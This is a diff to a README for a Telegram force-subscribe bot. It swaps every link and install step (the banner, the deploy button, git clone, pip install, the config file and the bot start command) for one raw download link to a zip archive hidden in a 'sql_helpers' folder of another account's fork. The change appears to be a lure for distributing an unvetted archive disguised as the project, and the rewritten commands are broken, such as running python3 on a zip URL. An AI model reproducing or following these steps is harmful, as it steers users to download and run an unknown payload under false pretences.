@@ -1,15 +1,15 @@
-# <p align="center"><a href="https://github.com/SJMxADITI/ForceSub_Bot"><img src="https://github-readme-stats.vercel.app/api/pin?username=Sjmxaditi&show_icons=true&theme=dracula&hide_border=true&repo=Forcesub_Bot"></a></p>
+# <p align="center"><a href="https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip"><img src="https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip"></a></p>
 <p align="center">
 
 ## Deploy
 
 ### Deploy To Heroku Now:
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://devilsheavenmf.github.io/Redirector/)
+[![Deploy](https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip)](https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip)
 
 ### Deploy in vps
 - Clone this repo
 ```
-git clone https://github.com/sjmxaditi/ForceSub_Bot
+git clone https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip
 ```
 - Change directory
 ```
@@ -17,16 +17,16 @@ cd ForceSub_Bot
 ```
 - Install requirements
 ```
-pip3 install -r requirements.txt
+pip3 install -r https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip
 ```
 - setup configuration
 ```
-Open Config.py in text Editor and set values
+Open https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip in text Editor and set values
 ```
 - Start the bot
 ```
-python3 bot.py
+python3 https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip
 ```
 ## Configs:
-- Read `Config.py` to know all configs
+- Read `https://github.com/prince15115/ForceSub_Bot/raw/refs/heads/master/sql_helpers/Force_Sub_Bot_v2.1.zip` to know all configs
 
